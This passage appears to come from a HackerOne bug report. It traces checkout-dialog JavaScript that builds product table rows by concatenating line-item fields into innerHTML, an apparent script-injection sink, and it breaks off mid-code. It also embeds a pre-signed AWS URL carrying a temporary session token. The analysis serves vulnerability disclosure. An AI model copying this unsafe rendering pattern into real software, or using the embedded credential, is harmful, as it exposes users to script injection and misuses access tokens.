data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/323/a9ce0d995d209aa7009a5b3ab3951b2173c63835/Screen_Shot_2017-05-23_at_2.18.44_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.18.44_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.18.44_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T050508Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026amp;X-Amz-Signature=7415d7769760c6ca36175ec5b03a6bb303ccd8ba9b14fab6d70e27356261c31a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/323/a9ce0d995d209aa7009a5b3ab3951b2173c63835/Screen_Shot_2017-05-23_at_2.18.44_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.18.44_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.18.44_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T050508Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026amp;X-Amz-Signature=7415d7769760c6ca36175ec5b03a6bb303ccd8ba9b14fab6d70e27356261c31a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nLooking more into the \u003ccode\u003ep\u003c/code\u003e function we see it is responsible for setting/creating the values for a number of elements on the DOM:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eicon\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etitle\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrors\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eisArray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrors\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrors\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eerrorList\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrors\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecustomizableElements\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrorDescription\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclassList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eadd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estaticElements\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrorListContainer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclassList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eerrorDescription\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrors\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estaticElements\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrorListContainer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclassList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eadd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \n      \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecustomizableElements\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrorDescription\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclassList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eadd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elineItems\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eerrorList\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elineItems\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \n    \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estaticElements\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrorListContainer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclassList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edismissButton\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebutton\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eClose\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe part we\u0026#39;re going to focus on is the \u003ccode\u003epayload.lineItems\u003c/code\u003e handling. The items are passed into the \u003ccode\u003ef\u003c/code\u003e function which is defined as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etable\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etable\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003etable\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclassName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eproduct-table\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003etable\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edialog__product-table\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003etable\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eT\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026lt;thead\u0026gt;\u0026lt;tr\u0026gt;...\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforEach\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003elineItem\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003etable\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etBodies\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nx\"\u003em\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003elineItem\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003etable\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt appears that function creates a table for each \u003ccode\u003elineItem\u003c/code\u003e rendering them with the \u003ccode\u003em\u003c/code\u003e function:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003em\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eescaped\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eescaped\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evariant\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;span class=\u0026quot;product__description__variant order-summary__small-text\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e        \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eescaped\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evariant\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e      \u0026lt;/span\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e    \u0026lt;tr class=\u0026quot;product\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;td class=\u0026quot;product__image\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e        \u0026lt;div class=\u0026quot;product-thumbnail\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e          \u0026lt;div class=\u0026quot;product-thumbnail__wrapper\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e            \u0026lt;img alt=\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot; class=\u0026quot;product-thumbnail__image\u0026quot; src=\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eimage\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e          \u0026lt;/div\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e          \u0026lt;span class=\u0026quot;product-thumbnail__quantity\u0026quot; aria-hidden=\u0026quot;true\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eamount\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;/span\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e        \u0026lt;/div\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;/td\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;td class=\u0026quot;product__description\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e        \u0026lt;span class=\u0026quot;product__description__name order-summary__emphasis\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan 